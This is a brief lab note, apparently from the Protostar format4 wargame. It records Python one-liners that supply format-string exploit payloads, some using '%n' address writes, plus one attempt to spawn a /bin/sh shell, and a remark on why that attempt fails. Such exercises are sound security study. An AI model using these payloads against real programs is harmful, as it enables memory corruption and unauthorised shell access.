dump way: python -c "print 'AAAAAAAA' + '\x24\x97\x04\x08'+'%x '*4+'%134513800x '+'%n'" | ./format4 <br>
pop shell attempts:
- **#1** python -c "print 'AAAAAAAA' + '\x24\x97\x04\x08'+'BBBB'+'\x26\x97\x04\x08'+'\xc0\xf4\xff\xbf'+'\xc2\xf4\xff\xbf'+'%x '*4+'%26196x '+'%n'+'%20825x '+'%n'+'%109524x '+'%9\$n' +'%21564x' +'%10\$n'" => would fail cuz before calling exit it will move **1** to ESP, **overwriting** the pointer to **/bin/sh**
